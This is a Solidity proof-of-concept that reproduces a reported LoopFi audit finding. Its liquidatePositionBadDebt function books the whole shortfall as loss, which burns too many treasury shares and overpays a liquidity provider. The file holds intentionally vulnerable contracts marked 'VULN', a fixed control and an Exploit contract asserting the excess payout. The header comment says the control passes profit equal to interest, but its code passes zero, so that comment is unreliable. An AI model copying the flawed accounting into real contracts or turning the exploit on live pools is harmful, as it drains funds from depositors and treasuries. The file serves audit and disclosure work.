// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LoopFi — CDPVault.liquidatePositionBadDebt (Code4rena 2024-10, H-02).
    debt = 100, interest = 50, collateral value = 90. loss is booked as
    60 and profit as 0, so PoolV3 burns 60 treasury shares. The treasury
    should lose 10 (100 - 90). An LP who redeems 900 shares is paid
    957.446808510638297872 instead of 909.090909090909090909.
    The control passes profit = interest and loss = 10 and the LP gets the fair amount. */

contract Asset {
    string public symbol = "lpETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PoolV3 {
    Asset public asset;
    uint256 public totalSupply;
    uint256 public assets;
    address public treasury;
    mapping(address => uint256) public balanceOf;

    constructor(Asset _asset, address _treasury) {
        asset = _asset;
        treasury = _treasury;
    }

    function seed(address lp, uint256 lpShares, uint256 treasuryShares, uint256 assetAmount) external {
        balanceOf[lp] = lpShares;
        balanceOf[treasury] = treasuryShares;
        totalSupply = lpShares + treasuryShares;
        assets = assetAmount;
        asset.mint(address(this), assetAmount);
    }

    function repayCreditAccount(uint256 repaidAmount, uint256 profit, uint256 loss) external {
        repaidAmount;
        if (profit > 0) {
            _mint(treasury, _convertToShares(profit));
        } else if (loss > 0) {
            uint256 sharesToBurn = _convertToShares(loss);
            uint256 sharesInTreasury = balanceOf[treasury];
            if (sharesToBurn > sharesInTreasury) sharesToBurn = sharesInTreasury;
            _burn(treasury, sharesToBurn);
        }
    }

    function redeem(uint256 shares) external returns (uint256 assetsOut) {
        assetsOut = assets * shares / totalSupply;
        _burn(msg.sender, shares);
        assets -= assetsOut;
        require(asset.transfer(msg.sender, assetsOut), "pay");
    }

    function _convertToShares(uint256 amount) internal view returns (uint256) {
        return amount * totalSupply / assets;
    }

    function _mint(address to, uint256 shares) internal {
        balanceOf[to] += shares;
        totalSupply += shares;
    }

    function _burn(address from, uint256 shares) internal {
        balanceOf[from] -= shares;
        totalSupply -= shares;
    }
}

contract PoolV3Fixed {
    Asset public asset;
    uint256 public totalSupply;
    uint256 public assets;
    address public treasury;
    mapping(address => uint256) public balanceOf;

    constructor(Asset _asset, address _treasury) {
        asset = _asset;
        treasury = _treasury;
    }

    function seed(address lp, uint256 lpShares, uint256 treasuryShares, uint256 assetAmount) external {
        balanceOf[lp] = lpShares;
        balanceOf[treasury] = treasuryShares;
        totalSupply = lpShares + treasuryShares;
        assets = assetAmount;
        asset.mint(address(this), assetAmount);
    }

    function repayCreditAccount(uint256 repaidAmount, uint256 profit, uint256 loss) external {
        repaidAmount;
        if (profit > 0) _mint(treasury, profit * totalSupply / assets);
        if (loss > 0) {
            uint256 sharesToBurn = loss * totalSupply / assets;
            if (sharesToBurn > balanceOf[treasury]) sharesToBurn = balanceOf[treasury];
            balanceOf[treasury] -= sharesToBurn;
            totalSupply -= sharesToBurn;
        }
    }

    function redeem(uint256 shares) external returns (uint256 assetsOut) {
        assetsOut = assets * shares / totalSupply;
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        assets -= assetsOut;
        require(asset.transfer(msg.sender, assetsOut), "pay");
    }

    function _mint(address to, uint256 shares) internal {
        balanceOf[to] += shares;
        totalSupply += shares;
    }
}

contract CDPVault {
    struct DebtData {
        uint256 debt;
        uint256 accruedInterest;
    }

    PoolV3 public pool;
    Asset public collateral;
    uint256 public discountedPrice = 1 ether;
    DebtData public debtData;
    uint256 public positionCollateral;
    uint256 public lastLoss;
    uint256 public lastProfit;

    constructor(PoolV3 _pool, Asset _collateral) {
        pool = _pool;
        collateral = _collateral;
    }

    function open(uint256 debt, uint256 interest, uint256 collateralAmount) external {
        debtData = DebtData(debt, interest);
        positionCollateral = collateralAmount;
        collateral.mint(address(this), collateralAmount);
    }

    function liquidatePositionBadDebt() external {
        uint256 takeCollateral = positionCollateral;
        uint256 repayAmount = takeCollateral * discountedPrice / 1 ether;
        uint256 loss = debtData.debt + debtData.accruedInterest - repayAmount;
        uint256 profit;
        if (repayAmount > debtData.debt) {
            profit = repayAmount - debtData.debt;
        }
        lastLoss = loss;
        lastProfit = profit;
        // @> VULN: loss is the full 60 shortfall and profit is 0, so the pool burns 60 treasury shares instead of 10
        pool.repayCreditAccount(debtData.debt, profit, loss);
        require(collateral.transfer(msg.sender, takeCollateral), "coll");
        positionCollateral = 0;
    }
}

contract CDPVaultFixed {
    PoolV3Fixed public pool;
    Asset public collateral;
    uint256 public debt = 100 ether;
    uint256 public interest = 50 ether;
    uint256 public positionCollateral = 90 ether;

    constructor(PoolV3Fixed _pool, Asset _collateral) {
        pool = _pool;
        collateral = _collateral;
        collateral.mint(address(this), 90 ether);
    }

    function liquidatePositionBadDebt() external {
        uint256 repayAmount = positionCollateral;
        uint256 loss = debt - repayAmount;
        pool.repayCreditAccount(debt, 0, loss);
        require(collateral.transfer(msg.sender, positionCollateral), "coll");
    }
}

contract Treasury {}

contract Exploit {
    Asset public asset;
    Asset public collateral;
    PoolV3 public pool;
    CDPVault public vault;
    Treasury public treasury;
    uint256 public payout;
    uint256 public treasuryShares;

    constructor() {
        asset = new Asset();
        collateral = new Asset();
        treasury = new Treasury();
        pool = new PoolV3(asset, address(treasury));
        vault = new CDPVault(pool, collateral);
    }

    function run() external {
        pool.seed(address(this), 900 ether, 100 ether, 1000 ether);
        vault.open(100 ether, 50 ether, 90 ether);
        vault.liquidatePositionBadDebt();
        treasuryShares = pool.balanceOf(address(treasury));
        payout = pool.redeem(900 ether);
        uint256 fair = uint256(1000 ether) * 900 / 990;
        uint256 expected = uint256(1000 ether) * 900 / 940;
        require(vault.lastLoss() == 60 ether, "loss");
        require(vault.lastProfit() == 0, "profit");
        require(treasuryShares == 40 ether, "burned 60");
        require(payout == expected, "payout");
        require(payout - fair == expected - fair, "excess");
        require(asset.balanceOf(address(this)) == payout, "lp");
    }
}
